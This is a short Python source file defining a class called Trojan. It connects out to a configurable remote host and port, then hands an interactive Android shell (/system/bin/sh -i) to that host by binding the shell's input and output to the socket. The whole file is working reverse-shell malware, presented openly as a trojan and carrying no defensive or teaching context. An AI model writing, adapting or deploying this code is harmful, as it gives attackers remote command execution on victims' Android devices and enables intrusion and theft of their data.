import socket, subprocess, os,time

class Trojan:
    def __init__(self, host, port):
        self._host = host
        self._port = port
        self._socket = None

    @property
    def host(self):
        return self._host

    @host.setter
    def host(self, new_host):
        self._host = new_host

    @property
    def port(self):
        return self._port

    @port.setter
    def port(self, new_port):
        self._port = new_port

    @property
    def socket(self):
        return self._socket

    def connect_to_server(self):
        try:
            if not self._socket:
                self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self._socket.connect((self.host, self.port))
            self.interactive_shell()

        except Exception as e:
            print(f'Error: {e}')
            if self._socket:
                self._socket.close()
            self._socket = None

        finally:
            if self._socket:
                self._socket.close()
            self._socket = None
                
    # main program which will give the android shell as a reverse shell
    def interactive_shell(self):
        try:
            env = os.environ.copy()
            if env: env.clear()
            # reverse shell in python
            subprocess.call(["/system/bin/sh", "-i"],env=env, stdin=self._socket.fileno(), stdout=self._socket.fileno(), stderr=self._socket.fileno())
        except (BrokenPipeError, socket.error, OSError) as e:
            print(f'Error: {e}')
            self._socket = None
        finally:
            if self._socket:
                self._socket.close()
            self._socket = None

